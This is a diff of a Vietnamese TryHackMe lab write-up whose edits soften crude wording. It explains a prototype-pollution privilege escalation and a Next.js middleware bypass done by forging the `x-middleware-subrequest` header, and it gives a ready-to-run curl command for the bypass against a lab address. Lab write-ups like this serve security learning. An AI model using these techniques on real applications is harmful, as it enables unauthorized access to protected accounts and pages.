@@ -13,10 +13,10 @@ root@tryhackme:~# curl -b cookies.txt -X POST http://10.49.132.56:3000/api/user/
 {"status":"updated"}
 ```
 
--bây giờ tài khoản đ nào cũng có thuộc tính `__proto__` == true.cái api check flag của cái hệ thống này óc chó nữa, nó check thuộc tính admin=true, mà người dùng thường làm j có thuộc tính admin, nên nó nhảy xuống thuộc tính `__proto__`  rồi, ![[Pasted image 20260816210010.png]]-truy cập cái api/flag để lấy cờ thôi
+-bây giờ tài khoản nào cũng có thuộc tính `__proto__` có isAdmin == true. Cái api check flag của cái hệ thống này thiết kế có sơ hở nữa, nó check thuộc tính admin=true, mà người dùng thường làm j có thuộc tính admin, nên nó nhảy xuống thuộc tính `__proto__`  rồi, ![[Pasted image 20260816210010.png]]-truy cập cái api/flag để lấy cờ thôi
 
 # 2- thực hành bài 3: react/next js
-Phần này thực tế là tận dụng cái ngu của middleware là người dùng có thể thêm header *x-middleware-subrequest* mà thằng middleware tin tưởng và cứ thế bỏ qua request ko kiểm tra nữa
+Phần này thực tế là tận dụng sơ hở của middleware là người dùng có thể thêm header *x-middleware-subrequest* mà thằng middleware tin tưởng và cứ thế bỏ qua request ko kiểm tra nữa
 ```shell
 root@tryhackme:~# curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://10.49.132.56:3001/dashboard
 ```
